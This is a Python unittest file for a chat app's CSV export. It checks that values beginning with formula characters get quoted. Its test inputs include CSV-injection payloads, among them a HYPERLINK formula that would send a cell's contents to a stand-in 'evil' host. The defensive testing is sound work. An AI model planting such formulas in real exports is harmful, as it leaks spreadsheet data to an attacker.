"""CSV exports don't run chat text as spreadsheet formulas.

    python -m pytest tests/test_csv_safe.py -q
"""

from __future__ import annotations

import asyncio
import csv
import io
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from core.csv_safe import safe_cell  # noqa: E402
from core.models import ChatEvent, ChatUser, Platform  # noqa: E402
from core.store import Store  # noqa: E402


class SafeCellTests(unittest.TestCase):
    def test_formula_starts_are_quoted(self):
        for bad in ('=HYPERLINK("https://evil/?"&A2,"x")', "+1+1", "-2+3", "@SUM(A1)", "\tx", "\rx"):
            self.assertEqual(safe_cell(bad), "'" + bad)

    def test_plain_text_and_numbers_untouched(self):
        self.assertEqual(safe_cell("hello = world"), "hello = world")
        self.assertEqual(safe_cell(-5), -5)
        self.assertIsNone(safe_cell(None))


class ChatExportTests(unittest.TestCase):
    def test_chat_export_defuses_formula(self):
        with tempfile.TemporaryDirectory() as tmp:
            store = Store(Path(tmp) / "t.db", {"enabled": False}, {"enabled": True})

            async def go():
                await store.process_chat(ChatEvent(
                    platform=Platform.KICK,
                    user=ChatUser(platform=Platform.KICK, id="1", username="=evil"),
                    message='=HYPERLINK("https://evil/","x")',
                ))
                return await store.export_chat_csv()

            text = asyncio.run(go())
        rows = list(csv.reader(io.StringIO(text)))
        self.assertEqual(rows[1][5], "'=evil")
        self.assertEqual(rows[1][7], "'=HYPERLINK(\"https://evil/\",\"x\")")


if __name__ == "__main__":
    unittest.main()
